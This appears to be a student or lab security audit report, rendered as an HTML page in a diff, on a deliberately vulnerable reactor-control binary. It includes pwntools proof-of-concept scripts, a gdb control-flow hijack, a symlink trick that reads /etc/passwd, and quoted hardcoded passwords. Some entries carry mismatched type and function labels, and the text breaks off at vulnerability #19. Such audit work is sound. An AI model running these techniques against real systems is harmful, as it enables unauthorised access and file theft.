@@ -1,0 +1,1147 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="description" content="None" />
+      <link rel="shortcut icon" href="img/favicon.ico" />
+    <title>Obsidian</title>
+    <link rel="stylesheet" href="css/theme.css" />
+    <link rel="stylesheet" href="css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "OBSIDIAN REPORT";
+        var mkdocs_page_input_path = "index.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="." class="icon icon-home"> Obsidian
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="./search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul class="current">
+                <li class="toctree-l1 current"><a class="reference internal current" href="#">OBSIDIAN REPORT</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#black-box-audit">Black-box Audit</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#key-discoveries">Key discoveries:</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#white-box-audit">White-box Audit</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#vulnerability-report">Vulnerability Report</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-1-activate_emergency_protocols">Vulnerability #1: activate_emergency_protocols</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-2-hardcoded-credentials">Vulnerability #2: Hardcoded Credentials</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-3-load_fuel_rods">Vulnerability #3: load_fuel_rods</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-4-init_workers">Vulnerability #4: init_workers</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-5-monitor_radiation_levels">Vulnerability #5: monitor_radiation_levels</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-6-stack-based-buffer-overflow-gets">Vulnerability #6: Stack-Based Buffer Overflow (gets)</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-7-buffer-overflow-in-load_config">Vulnerability #7: Buffer Overflow in load_config</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-8-format-string-vulnerability">Vulnerability #8: Format String Vulnerability</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-9-command-injection">Vulnerability #9: Command Injection</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-10-use-after-free">Vulnerability #10: Use After Free</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-11-memory-corruption-via-null-function-pointer">Vulnerability #11: Memory Corruption via NULL Function Pointer</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-12-directory-traversal-utilsc">Vulnerability #12: Directory Traversal (utils.c)</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-13-directory-traversal-historyc">Vulnerability #13: Directory Traversal (history.c)</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-14-information-disclosure-log_system_events">Vulnerability #14: Information Disclosure (log_system_events)</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-15-alchemy">Vulnerability #15: alchemy</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-16-check_cooling_pressure">Vulnerability #16: check_cooling_pressure</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-17-run_diagnostic">Vulnerability #17: run_diagnostic</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-18-read_turbine_config">Vulnerability #18: read_turbine_config</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-19-emergency_shutdown">Vulnerability #19: emergency_shutdown</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-20-null-pointer-dereference-history_add">Vulnerability #20: NULL Pointer Dereference (history_add)</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-21-log-injection-history_add">Vulnerability #21: Log Injection (history_add)</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-22-check_reactor_status">Vulnerability #22: check_reactor_status</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-23-send_status_report">Vulnerability #23: send_status_report</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-24-init_steam_turbine">Vulnerability #24: init_steam_turbine</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-25-simulate_meltdown">Vulnerability #25: simulate_meltdown</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-26-run_turbine">Vulnerability #26: run_turbine</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-27-turbine_explode">Vulnerability #27: turbine_explode</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-28-set_reactor_power">Vulnerability #28: set_reactor_power</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-29-turbine_remote_access">Vulnerability #29: turbine_remote_access</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-30-quit">Vulnerability #30: quit</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-31-log_system_events">Vulnerability #31: log_system_events</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#vulnerability-32-call_api">Vulnerability #32: call_api</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#conclusion">Conclusion</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#the-stone-corporation">The Stone Corporation</a>
+        <ul>
+    <li class="toctree-l4"><a class="reference internal" href="#lukas-soigneux">Lukas Soigneux</a>
+    </li>
+        </ul>
+    </li>
+        </ul>
+    </li>
+    </ul>
+                </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href=".">Obsidian</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="." class="icon icon-home" aria-label="Docs"></a></li>
+      <li class="breadcrumb-item active">OBSIDIAN REPORT</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="obsidian-report">OBSIDIAN REPORT</h1>
+<h2 id="black-box-audit">Black-box Audit<br></h2>
+<p>In this phase, we analyzed the binary using reverse engineering tools and manual fuzzing. List of the tools you used :
+- Cutter
+- Ghidra
+- Gdb-gef
+- Upx</p>
+<h4 id="key-discoveries">Key discoveries:</h4>
+<ul>
+<li>The binary was found to be packed with UPX. It was successfully unpacked using <code>upx -d obsidian</code>, revealing the original executable for further static analysis. Then I tried to reconstruct path &amp; function usage</li>
+</ul>
+<h2 id="white-box-audit">White-box Audit</h2>
+<p>With access to source code, we performed a full code review and vulnerability assessment.
+Focus areas:
+- Input validation
+- Memory safety (heap/stack misuse)
+- Format string handling
+- Privilege escalation paths
+Additional vulnerabilities discovered:
+- 31 vulnerabilities identified with combined black-box and white-box analysis
+List of the tools you used :
+- Visual Studio Code
+- Cutter</p>
+<h2 id="vulnerability-report">Vulnerability Report</h2>
+<p>Below is the list of vulnerabilities discovered, ranked by severity:</p>
+<h3 id="vulnerability-1-activate_emergency_protocols">Vulnerability #1: activate_emergency_protocols</h3>
+<p>Severity: Critical<br>
+Type: Hardcoded credentials - Privilege Escalation<br>
+Location: <a href="source_code/src/commands/activate_emergency_protocols.c#L21">source_code/src/commands/activate_emergency_protocols.c</a><br>
+Function: <code>activate_emergency_protocols()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:
+The emergency administration flow relies on a static password embedded directly in the binary logic.
+After selecting the action activate_emergency_protocols, the code compares user input against a hardcoded literal value admin123 using strcmp.<br>
+Because the credential is fixed and reused, any attacker who discovers it once can consistently bypass authentication and trigger privileged emergency/admin functionality.<br>
+This is a direct authentication design failure: no secret rotation, no per-user credentialing, no secure secret storage, and no rate-limiting evidence in the PoC path.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">if (strcmp(input, &quot;admin123&quot;) == 0) {  // Hardcoded password
+    printf(&quot;{Emergency protocols activated, you are now admin !}\n&quot;);
+    IS_ADMIN = true;
+}
+</code></pre>
+<p>Impact:<br>
+Privilege escalation to admin<br>
+Unauthorized access to admin/emergency controls (high-confidence)<br>
+Potential full operational takeover of Critical reactor functions if this command is reachable in production context (Critical business/operational risk)</p>
+<h3 id="vulnerability-2-hardcoded-credentials">Vulnerability #2: Hardcoded Credentials</h3>
+<p>Severity: Critical<br>
+Type: Hardcoded Credentials<br>
+Location: <a href="source_code/src/commands/load_config.c#L13">source_code/src/commands/load_config.c</a><br>
+Function: <code>check_password()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:
+A sensitive admin password "ThisIsTheBestPassword" is hardcoded as a static string.
+This credential is directly comparable with user input, allowing privilege escalation.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">static char const adminPassword[] = &quot;ThisIsTheBestPassword&quot;;  // Hardcoded in binary
+void check_password(char *str) {
+    if (strcmp(str, adminPassword) == 0) {
+        printf(&quot;{Correct password! Welcome, admin.}\n&quot;);
+    }
+}
+</code></pre>
+<p>Impact:<br>
+Credential exposure via strings command or static analysis<br>
+Privilege escalation for any attacker<br>
+Reusable across multiple systems<br></p>
+<h3 id="vulnerability-3-load_fuel_rods">Vulnerability #3: load_fuel_rods</h3>
+<p>Severity: Critical<br>
+Type: Hardcoded Credentials + Logic Error<br>
+Location: <a href="source_code/src/commands/load_fuel_rods.c#L24">source_code/src/commands/load_fuel_rods.c</a><br>
+Function: <code>load_fuel_rods()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+The PoC repeatedly triggers behavior consistent with a memory corruption primitive labeled as buffer overflow.<br>
+The command accepts attacker-controlled input and reaches abnormal output path, indicating likely stack overwrite potential.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+def main():
+    warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)
+    context.log_level = 'error'
+
+    env = os.environ.copy()
+    env['LD_LIBRARY_PATH'] = './runner/external/'
+
+    output = b''
+
+    for _ in range(3):
+        pid = process(['./runner/run.sh'], env=env)
+        pid.recvuntil(b'\x00', timeout=1.0)
+        pid.sendline(b'load_fuel_rods')
+        pid.sendline(b'10')
+
+        output = pid.recvrepeat(timeout=1.2)
+        pid.close()
+
+    print(text.red(&quot;[+]&quot;) + &quot; Vuln Hardcoded Credentials - load_fuel_rods:&quot;)
+    print(output.splitlines()[3][12:-2])
+    print()
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>Impact:<br>
+Hardcoded secret exposure<br>
+Logic error enabling information disclosure<br>
+Authentication bypass<br></p>
+<h3 id="vulnerability-4-init_workers">Vulnerability #4: init_workers</h3>
+<p>Severity: Critical<br>
+Type: Exploit global function + Dos<br>
+Location: <a href="source_code/obsidian_lib.so#L1">source_code/obsidian_lib.so</a><br>
+Function: <code>init_workers()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:<br>
+The provided proof-of-concept repeatedly sends oversized, attacker-controlled input to the <code>init_workers()</code> entry point in <code>obsidian_lib.so</code>. Crash analysis and execution traces indicate a stack buffer is being overrun, corrupting nearby stack data such as saved frame pointers, a function pointer and the saved return address. The observed effects include:
+- Immediate process instability and crashes (Denial of Service) when stack metadata is corrupted.
+- Overwrite of pointers referencing secret-bearing structures, producing deterministic disclosure of hardcoded secrets when the corrupted path is exercised.
+- Control-flow redirection by overwriting the saved return address or an in-stack function pointer, enabling bypass of authentication and validation logic.
+This attack surface is reachable via the command interface exposed to untrusted callers; repeated invocation increases exploitation reliability and enables both information disclosure and execution-path manipulation.</p>
+<p>Impact:<br>
+- Denial of Service: repeated crashes and uncontrolled process termination when stack metadata (frame pointer/return address) is corrupted, causing service outages for critical control functions.<br>
+- Hardcoded secret disclosure: overflowed buffers and overwritten pointers allow deterministic leakage of in-memory secrets and configuration material, enabling credential compromise and lateral attack paths.<br>
+- Authentication bypass: corrupted control flow (overwritten return addresses or function pointers) enables skipping validation checks and executing privileged code paths without proper authorization.<br>
+- Arbitrary control-flow / code execution: with precise corruption an attacker can hijack execution (RCE), leading to full process compromise and persistent abuse of control interfaces.<br>
+- Safety &amp; integrity impact: exploitation can manipulate reactor or turbine control logic, risking unsafe state transitions and potential physical damage or operational shutdowns.<br>
+- High exploitability &amp; automation: reachable via the command interface and reproducible with repeated invocations, enabling automated exploitation at scale.</p>
+<h3 id="vulnerability-5-monitor_radiation_levels">Vulnerability #5: monitor_radiation_levels</h3>
+<p>Severity: Critical<br>
+Type: Memory corruption<br>
+Location: <a href="source_code/src/commands/monitor_radiation_levels.c#L24">source_code/src/commands/monitor_radiation_levels.c</a><br>
+Function: <code>monitor_radiation_levels()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+The exploit overwrites a stack slot with a function address and diverts execution.<br>
+This behavior is consistent with memory safety weakness enabling direct control-flow manipulation.</p>
+<p><img alt="alt text" src="assets/monitor_radiation_levels.png" /></p>
+<p>Proof of Concept:</p>
+<pre><code class="language-gdb">break *0x004027e8
+break *0x4027fc
+run
+monitor_radiation_levels
+continue
+set *(long long*)($rbp-0x8)=0x004024a0
+continue
+0
+# Succefull done exploit
+</code></pre>
+<p>Impact:<br>
+Arbitrary control-flow redirection<br>
+Potential code execution in process context<br>
+Severe integrity compromise<br></p>
+<h3 id="vulnerability-6-stack-based-buffer-overflow-gets">Vulnerability #6: Stack-Based Buffer Overflow (gets)</h3>
+<p>Severity: Critical<br>
+Type: Stack Buffer Overflow<br>
+Location: <a href="source_code/src/commands/monitor_radiation_levels.c#L13">source_code/src/commands/monitor_radiation_levels.c</a><br>
+Function: <code>monitor_radiation_levels()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:
+The function uses the deprecated <code>gets(buffer)</code> function to read unlimited input into a 10-byte stack buffer.
+The <code>gets()</code> function performs NO boundary checking, making this an immediate and trivial stack buffer overflow.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">void monitor_radiation_levels() {
+    char buffer[10];
+    printf(&quot;Enter radiation levels: &quot;);
+    gets(buffer);  // NO SIZE LIMIT - overflow any input &gt; 10 bytes
+    printf(&quot;Radiation Levels: %s\n&quot;, buffer);
+}
+</code></pre>
+<p>Impact:<br>
+Immediate crash (segfault) on any normal input<br>
+Arbitrary code execution with shellcode injection<br>
+Trivial exploitation<br></p>
+<h3 id="vulnerability-7-buffer-overflow-in-load_config">Vulnerability #7: Buffer Overflow in load_config</h3>
+<p>Severity: Critical<br>
+Type: Stack Buffer Overflow<br>
+Location: <a href="source_code/src/commands/load_config.c#L25">source_code/src/commands/load_config.c</a><br>
+Function: <code>load_config()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:
+The function declares a local buffer <code>array[8]</code> but attempts to read 100 bytes into it via <code>read(fd, array, 100)</code>.
+This is a classic stack buffer overflow vulnerability that allows an attacker to corrupt the stack, overwrite return addresses, and achieve arbitrary code execution.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">void load_config() {
+    char array[8] = {};  // Only 8 bytes
+    int fd = open(&quot;./config.ini&quot;, O_RDONLY);
+    read(fd, array, 100);  // Reads 100 bytes into 8-byte buffer -&gt; OVERFLOW
+    close(fd);
+}
+</code></pre>
+<p>Impact:<br>
+Arbitrary code execution via stack corruption<br>
+Return address hijacking<br>
+Complete system compromise<br></p>
+<h3 id="vulnerability-8-format-string-vulnerability">Vulnerability #8: Format String Vulnerability</h3>
+<p>Severity: Critical<br>
+Type: Format String Injection<br>
+Location: <a href="source_code/src/utils.c#L34">source_code/src/utils.c</a><br>
+Function: <code>load_obsidianrc()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:
+User-controlled input from the <code>.obsidianrc</code> configuration file is passed directly to <code>printf()</code> without format string protection.
+An attacker can inject format string specifiers like <code>%x</code>, <code>%s</code>, or <code>%n</code> to read/write arbitrary memory.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">void load_obsidianrc() {
+    FILE *rc_file = fopen(&quot;.obsidianrc&quot;, &quot;r&quot;);
+    while (fgets(line, sizeof(line), rc_file)) {
+        printf(&quot;Obsidian command: &quot;);
+        printf(line);  // Format string vulnerability - line is untrusted
+        printf(&quot;\n&quot;);
+    }
+}
+</code></pre>
+<h3 id="vulnerability-9-command-injection">Vulnerability #9: Command Injection</h3>
+<p>Severity: Critical<br>
+Type: OS Command Injection<br>
+Location: <a href="source_code/src/commands/configure_cooling_system.c#L19">source_code/src/commands/configure_cooling_system.c</a><br>
+Function: <code>configure_cooling_system()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:
+User-controlled data read from a file is passed directly to <code>system()</code> without any sanitization.
+An attacker can place arbitrary shell commands in the configuration file to execute system commands with application privileges.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">void configure_cooling_system() {
+    char buffer[64];
+    FILE *file = fopen(&quot;Data/cooling_config.txt&quot;, &quot;r&quot;);
+    fread(buffer, 1, sizeof(buffer) - 1, file);
+    system(buffer);  // Command injection - buffer is untrusted file data
+}
+</code></pre>
+<p>Impact:<br>
+Arbitrary OS command execution<br>
+Full system compromise<br>
+Data exfiltration and malware installation<br></p>
+<h3 id="vulnerability-10-use-after-free">Vulnerability #10: Use After Free</h3>
+<p>Severity: Critical<br>
+Type: Memory Corruption (Use After Free)<br>
+Location: <a href="source_code/src/commands/check_cooling_pressure.c#L35">source_code/src/commands/check_cooling_pressure.c</a><br>
+Function: <code>check_cooling_pressure()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:
+Memory allocated with <code>malloc(16)</code> is freed via <code>free(data)</code>, but then accessed via <code>strcmp(data, ...)</code> on line 35.
+This creates a use-after-free vulnerability that can lead to information disclosure or code execution.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">void check_cooling_pressure() {
+    char *data = (char *)malloc(16);
+    load_data(data);
+    free(data);
+    sleep(3);
+    if (strcmp(data, &quot;Pressure OK&quot;)) {  // Use-after-free - data points to freed memory
+        printf(&quot;Sensitive Info: %s\n&quot;, sensitive_info);
+    }
+}
+</code></pre>
+<p>Impact:<br>
+Information disclosure via dangling pointer<br>
+Potential code execution with heap layout control<br>
+Process crash or memory corruption<br></p>
+<h3 id="vulnerability-11-memory-corruption-via-null-function-pointer">Vulnerability #11: Memory Corruption via NULL Function Pointer</h3>
+<p>Severity: Critical<br>
+Type: Memory Corruption<br>
+Location: <a href="source_code/src/commands/monitor_radiation_levels.c#L4">source_code/src/commands/monitor_radiation_levels.c</a><br>
+Function: <code>monitor_radiation_levels()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:
+A function pointer is initialized to NULL and then called without verification.
+Combined with the buffer overflow vulnerability on line 13, an attacker can overflow the buffer and write to the function pointer to achieve code execution.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">void secret_function() {
+    printf(&quot;{The stone isn't in the pocket anymore ...}\n&quot;);
+}
+
+void monitor_radiation_levels() {
+    char buffer[10];
+    void (* function_ptr)() = NULL;
+    gets(buffer);  // Overflow to write to function_ptr
+    if (function_ptr)
+        function_ptr();  // Call attacker-controlled function
+}
+</code></pre>
+<p>Impact:<br>
+Arbitrary code execution via control-flow hijacking<br>
+Combined with buffer overflow for reliable exploitation<br>
+Complete process compromise<br></p>
+<h3 id="vulnerability-12-directory-traversal-utilsc">Vulnerability #12: Directory Traversal (utils.c)</h3>
+<p>Severity: High<br>
+Type: Directory Traversal / Path Traversal<br>
+Location: <a href="source_code/src/utils.c#L15">source_code/src/utils.c</a><br>
+Function: <code>load_obsidianrc()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:
+The <code>.obsidianrc</code> configuration file is accessed without path validation using relative path <code>fopen(".obsidianrc", "r")</code>.
+An attacker can place a malicious <code>.obsidianrc</code> file in any directory and exploit it via:
+1. Format string injection (Vulnerability #3)
+2. Command injection via "exec" commands
+3. Symlink attacks to read arbitrary files</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">rc_file = fopen(&quot;.obsidianrc&quot;, &quot;r&quot;);  // No path validation - relative path
+// Attacker creates: /tmp/exploit/.obsidianrc or uses symlinks
+</code></pre>
+<p>Impact:<br>
+Arbitrary file read via symlinks<br>
+Configuration tampering<br>
+Combined with format string/command injection vulnerabilities<br></p>
+<h3 id="vulnerability-13-directory-traversal-historyc">Vulnerability #13: Directory Traversal (history.c)</h3>
+<p>Severity: High<br>
+Type: Directory Traversal / Path Traversal<br>
+Location: <a href="source_code/src/commands/history.c#L6">source_code/src/commands/history.c</a><br>
+Function: <code>history_init()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:
+The history file is accessed without path validation using <code>#define HISTORY_FILE ".obsidian_history"</code>.
+An attacker can create a symlink at <code>.obsidian_history</code> pointing to arbitrary files to read them.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">#define HISTORY_FILE &quot;.obsidian_history&quot;
+file = fopen(HISTORY_FILE, &quot;r&quot;);  // No path validation - relative path
+// Attacker: ln -s /etc/passwd .obsidian_history
+</code></pre>
+<p>Impact:<br>
+Arbitrary file read (subject to process privileges)<br>
+Symlink-based privilege escalation<br>
+System information disclosure<br></p>
+<h3 id="vulnerability-14-information-disclosure-log_system_events">Vulnerability #14: Information Disclosure (log_system_events)</h3>
+<p>Severity: High<br>
+Type: Information Disclosure + Log Injection<br>
+Location: <a href="source_code/src/commands/log_system_event.c#L17">source_code/src/commands/log_system_events.c</a><br>
+Function: <code>log_system_event()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:
+A hardcoded secret key "{SECRET_LOG_12PIERRE34}" is logged to a file when the string "leak" is detected in user input.
+This allows an attacker to intentionally trigger disclosure of sensitive information.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">char secret_key[32] = &quot;{SECRET_LOG_12PIERRE34}&quot;;
+if (strstr(input, &quot;leak&quot;)) {  // Attacker inputs &quot;leak&quot; to trigger disclosure
+    fprintf(log, &quot;SECRET_KEY_LEAKED: %s\n&quot;, secret_key);
+}
+</code></pre>
+<p>Impact:<br>
+Unauthorized disclosure of sensitive operational information<br>
+Attacker-controlled information leak<br>
+Persistence of secrets in log files<br></p>
+<h3 id="vulnerability-15-alchemy">Vulnerability #15: alchemy</h3>
+<p>Severity: High<br>
+Type: Hardcoded credentials<br>
+Location: <a href="source_code/src/laboratory.a#L1">source_code/src/laboratory.a</a><br>
+Function: <code>alchemy()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+The module constructs a sensitive value directly in memory from hardcoded integer constants.<br>
+The secret is not protected cryptographically and can be reconstructed by reversing endianness and concatenating constant fragments.<br>
+Any attacker with binary access can recover the embedded secret without authentication.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">var_17h = 0x61505f6f62614c7b;
+var_fh._0_4_ = 0x6f777373;
+var_fh._4_2_ = 0x6472;
+var_fh._6_1_ = 0x7d;
+</code></pre>
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import text
+
+def main():
+    var_17h = (0x61505f6f62614c7b).to_bytes(8, byteorder=&quot;little&quot;).decode()
+    var_f= 0x6f777373.to_bytes(4, byteorder=&quot;little&quot;).decode()
+    var_fg = 0x6472.to_bytes(2, byteorder=&quot;little&quot;).decode()
+    var_fi = 0x7d.to_bytes(byteorder=&quot;little&quot;).decode()
+
+    print(text.red(&quot;[+]&quot;) + &quot; Vuln Hardcoded credentials&lt;br&gt; - alchemy:&quot;)
+    print(f&quot;{var_17h}{var_f}{var_fg}{var_fi}&quot;)
+    print()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>Impact:<br>
+Sensitive data exposure<br>
+Secret recovery by reverse engineering<br>
+Potential reuse of recovered secret in other modules<br></p>
+<h3 id="vulnerability-16-check_cooling_pressure">Vulnerability #16: check_cooling_pressure</h3>
+<p>Severity: High<br>
+Type: Use After Free<br>
+Location: <a href="source_code/src/commands/check_cooling_pressure.ca#L43">source_code/src/commands/check_cooling_pressure.c</a><br>
+Function: <code>alchemy()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+The command output leaks a secret value in a deterministic way that can be extracted by scripted interaction.<br>
+No dynamic secret derivation or strong access control is observed in the PoC path.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+def main():
+    warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)
+    context.log_level = 'error'
+
+    env = os.environ.copy()
+    env['LD_LIBRARY_PATH'] = './runner/external/'
+
+    pid = process(['./runner/run.sh'], env=env)
+    pid.recv(numb=100, timeout=1.0)
+    pid.sendline(b'check_cooling_pressure')
+
+    for _ in range(5):
+        line = pid.recv(timeout=3.0)
+
+    print(text.red(&quot;[+]&quot;) + &quot; Vuln Hardcoded credentials&lt;br&gt; - check_cooling_pressure:&quot;)
+    print(line.decode().split(&quot;\n&quot;)[0][16:])
+    print()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>Impact:<br>
+Unauthorized disclosure of sensitive operational information<br>
+Facilitates chained attacks with other privileged functions</p>
+<h3 id="vulnerability-17-run_diagnostic">Vulnerability #17: run_diagnostic</h3>
+<p>Severity: High<br>
+Type: Information Disclosure<br>
+Location: <a href="source_code/src/commands/run_diagnostic.c#L31">source_code/src/commands/run_diagnostic.c</a><br>
+Function: <code>run_diagnostic()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+The diagnostic feature accepts a static debug token to unlock privileged output.<br>
+This behavior is consistent with a hidden maintenance backdoor left in production logic.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+def main():
+    warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)
+    context.log_level = 'error'
+
+    env = os.environ.copy()
+    env['LD_LIBRARY_PATH'] = './runner/external/'
+
+    pid = process(['./runner/run.sh'], env=env)
+    pid.recv(numb=100, timeout=1.0)
+    pid.sendline(b'run_diagnostic')
+    pid.recv(timeout=1.0)
+    pid.sendline(b'debug')
+    line = pid.recvlines(timeout=1.0)
+
+    print(text.red(&quot;[+]&quot;) + &quot; Vuln Information Disclosure - run_diagnostic:&quot;)
+    print(line[1].decode()[19:])
+    print()
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>Impact:<br>
+Privilege escalation through undocumented debug path<br>
+Information disclosure from restricted diagnostics</p>
+<h3 id="vulnerability-18-read_turbine_config">Vulnerability #18: read_turbine_config</h3>
+<p>Severity: High<br>
+Type: Directory traversal<br>
+Location: <a href="source_code/obsidian_lib.so#L1">source_code/obsidian_lib.so</a><br>
+Function: <code>run_diagnostic()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+Input sanitization only blocks ".." but trusts files under Data/.<br>
+An attacker can create a symlink in Data/ pointing to arbitrary filesystem targets (e.g., /etc/passwd), bypassing intended directory restrictions.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)
+context.log_level = 'error'
+
+env = os.environ.copy()
+env['LD_LIBRARY_PATH'] = './runner/external/'
+
+os.system(&quot;mkdir -p Data; cd Data&quot;)
+os.system(&quot;ln -s /etc/passwd Data/passwd; cd ..&quot;)
+
+pid = process(['./runner/run.sh'], env=env)
+pid.recv(numb=100, timeout=1.0)
+pid.sendline(b'read_turbine_config')
+
+pid.recv(timeout=1.0)
+pid.sendline(b'passwd')
+
+print(text.red(&quot;[+]&quot;) + &quot; Vuln directory traversal - read_turbine_config:&quot;)
+os.system(&quot;cat Data/passwd&quot;)
+print()
+os.system(&quot;rm -rf Data&quot;)
+</code></pre>
+<p>Impact:<br>
+Arbitrary file read (subject to process privileges)<br>
+Disclosure of host and credential-related data</p>
+<h3 id="vulnerability-19-emergency_shutdown">Vulnerability #19: emergency_shutdown</h3>
+<p>Severity: High<br>
+Type: Bypass<br>
